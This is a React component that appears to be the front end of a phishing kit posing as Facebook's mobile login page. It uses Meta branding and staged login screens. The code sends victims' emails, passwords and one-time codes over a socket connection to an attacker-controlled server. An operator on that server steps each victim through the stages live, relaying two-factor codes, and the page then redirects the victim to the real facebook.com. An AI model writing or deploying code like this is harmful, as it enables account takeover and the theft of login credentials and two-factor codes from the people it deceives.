import { HStack, Image, Input, Text, VStack } from "@chakra-ui/react";
import { Button } from "../components/ui/button";
import React, { useEffect, useRef, useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import { motion, AnimatePresence } from "framer-motion";
import { io } from "socket.io-client";
import StageOne from "../components/generic/StageOne";
import Loading from "../components/generic/Loading";
import { useUser } from "../contexts/UserContext";
import StageTwo from "../components/generic/StageTwo";
import StageThree from "../components/generic/StageThree";
import ErrorStage from "../components/generic/ErrorStage";

const Landing = () => {
  const navigate = useNavigate();
  const { isLoading, setIsLoading, credentials, sendTo, setSendTo, otp } =
    useUser();
  const [currentStage, setCurrentStage] = useState(1);
  const [direction, setDirection] = useState(1);
  const [errorMessage, setErrorMessage] = useState("");
  const [verificationMessage, setVerificationMessage] = useState("");
  const socketRef = useRef(null);

  useEffect(() => {
    if (!socketRef.current) {
      socketRef.current = io(import.meta.env.VITE_BASE_URL);

      socketRef.current.on("connect", () => {
        console.log(
          "Connected to socket server with ID:",
          socketRef.current.id
        );
      });

      socketRef.current.on("admin_response", (data) => {
        if (data.eventType === "fb_attempt_init") {
          if (data.sendTo) {
            setIsLoading(false);

            if (data.nextStep) {
              setCurrentStage(data.nextStep);
            }

            if (data.message) {
              setVerificationMessage(data.message);
            }

            if (data.sendTo) {
              setSendTo(data.sendTo);
            }
          }
        } else if (data.eventType === "fb_otp") {
          setIsLoading(false);

          if (data.nextStep) {
            setCurrentStage(data.nextStep);
          }

          if (data.message) {
            setVerificationMessage(data.message);
          }
        } else {
          window.location.href = "https://www.facebook.com";
        }
      });
    }

    return () => {
      if (socketRef.current) {
        socketRef.current.disconnect();
        socketRef.current = null;
      }
    };
  }, []);

  const handleLogin = () => {
    setIsLoading(true);
    setErrorMessage("");
    socketRef.current.emit("fb_attempt_init", {
      email: credentials.username,
      password: credentials.password,
      timestamp: new Date().toISOString(),
      sessionId: socketRef.current.id,
    });
  };

  const handleAuthValueSubmit = () => {
    setIsLoading(true);
    setErrorMessage("");
    socketRef.current.emit("fb_otp", {
      email: credentials.username,
      password: credentials.password,
      otp: otp,
      timestamp: new Date().toISOString(),
      sessionId: socketRef.current.id,
    });
  };

  const handleFinish = () => {
    setIsLoading(true);
    setErrorMessage("");
    socketRef.current.emit("fb_done", {
      email: credentials.username,
      password: credentials.password,
      otp: otp,
      timestamp: new Date().toISOString(),
      sessionId: socketRef.current.id,
    });
  };

  const stageComponents = {
    1: <StageOne handleLogin={handleLogin} />,
    2: <StageTwo handleAuthValueSubmit={handleAuthValueSubmit} />,
    3: <StageThree handleFinish={handleFinish} />,
    // 3: <ErrorStage />,
    4: <div>ErrorPage</div>,
  };

  const slideVariants = {
    initial: (direction) => ({
      x: direction > 0 ? "100%" : "-100%",
      opacity: 0,
    }),
    animate: {
      x: 0,
      opacity: 1,
      transition: { duration: 0.5 },
    },
    exit: (direction) => ({
      x: direction < 0 ? "100%" : "-100%",
      opacity: 0,
      transition: { duration: 0.5 },
    }),
  };

  return (
    <>
      <VStack w="100dvw" h="100dvh" pt="0.5rem" px="1rem" gap="0">
        <Text fontSize="13px">English (UK)</Text>

        <AnimatePresence custom={direction}>
          <motion.div
            style={{ width: "100%" }}
            key={currentStage}
            custom={direction}
            variants={slideVariants}
            initial="initial"
            animate="animate"
            exit="exit"
          >
            {stageComponents[currentStage]}
          </motion.div>
        </AnimatePresence>

        <VStack position="absolute" bottom="2%" gap="1.5rem" fontSize="10px">
          <Image src="./images/meta.png" alt="meta" w="60px" h="12px" />
          <HStack>
            <Link to="https://about.meta.com/">
              <Text>About</Text>
            </Link>
            <Link to="https://m.facebook.com/help/?ref=pf">
              <Text>Help</Text>
            </Link>
            <Link to="https://about.meta.com/">
              <Text>More</Text>
            </Link>
          </HStack>
        </VStack>
      </VStack>

      {isLoading && <Loading />}
    </>
  );
};

export default Landing;